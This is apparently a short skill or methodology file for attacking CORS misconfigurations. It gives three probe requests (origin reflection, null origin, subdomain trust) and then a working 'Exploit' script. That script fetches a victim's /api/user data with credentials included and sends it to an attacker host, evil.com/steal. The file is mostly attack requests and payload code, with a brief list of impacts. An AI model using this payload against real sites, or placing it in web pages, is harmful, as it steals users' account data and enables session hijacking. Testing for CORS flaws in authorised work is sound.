---
name: cors-misconfig
description: CORS misconfiguration - origin reflection, null origin, subdomain trust, credential theft
---

# CORS Attack Methodology

## Step 1: Test Origin Reflection
```http
GET /api/user HTTP/1.1
Origin: https://evil.com

# If response includes:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
# VULNERABLE
```

## Step 2: Test Null Origin
```http
GET /api/user HTTP/1.1
Origin: null

# If response includes:
Access-Control-Allow-Origin: null
# VULNERABLE
```

## Step 3: Test Subdomain Trust
```http
GET /api/user HTTP/1.1
Origin: https://evil.target.com

# If response includes:
Access-Control-Allow-Origin: https://evil.target.com
# VULNERABLE
```

## Step 4: Exploit
```html
<script>
fetch('https://target.com/api/user', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    fetch('https://evil.com/steal?data=' + JSON.stringify(data));
  });
</script>
```

## Impact
- Data theft via CORS misconfiguration
- Account takeover via credential theft
- Session hijacking
